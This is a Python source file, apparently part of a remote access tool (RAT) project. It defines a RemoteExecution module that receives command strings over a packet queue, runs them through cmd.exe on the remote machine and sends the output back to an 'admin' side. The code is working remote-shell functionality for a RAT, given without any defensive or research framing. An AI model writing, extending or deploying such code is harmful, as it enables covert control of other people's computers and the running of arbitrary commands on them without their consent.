import struct
import pyautogui
import os
import subprocess
from Constants import PACKET_SIZE
from RATFunction.RATFunction import RATFunction

#RemoteExecution



class RemoteExecution(RATFunction):
    # packet_id | is_err | cmd_str_size | cmd_str
    command_packet_struct = struct.Struct(f"I I I {PACKET_SIZE - 4 - 4 - 4}s")
    def __init__(self, side, packet_queue):
        super().__init__(side, packet_queue)
        self.received_command_callback = lambda command_str, is_err: ()
        self.process = None

    def handle_packet_admin_side(self, data):
        packet_id, is_err, cmd_str_size, cmd_str = self.command_packet_struct.unpack(data)
        cmd_str = cmd_str[:cmd_str_size].decode()
        self.received_command_callback(cmd_str, bool(is_err))



    def send_output_from_command(self, output, err=False):
        output_bytes = output.encode()
        packet = self.command_packet_struct.pack(self.identifier(), 1 if err else 0,
                                                   len(output_bytes), output_bytes)
        self.packet_queue.put(packet)
    def handle_packet_remote_side(self, data):
        packet_id, command_str = struct.unpack(f"I {PACKET_SIZE - 4}s", data)
        command_str = command_str.decode().rstrip('\0')
        self.do_execute_command(command_str)


    def do_execute_command(self, command_str):
        try:
            process = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT, universal_newlines=True)
            process.stdin.write(command_str + "\n")
            process.stdin.close()
            output = process.stdout.read()
            process.stdout.close()
            process.wait()
            self.send_output_from_command(output)

        except subprocess.CalledProcessError as e:
            output = e.output
            self.send_output_from_command(output, True)


    def identifier(self) -> int:
        return 6

    def send_command(self, text):
        self.packet_queue.put(struct.pack(f"I {PACKET_SIZE - 4}s", self.identifier(), text.encode()))

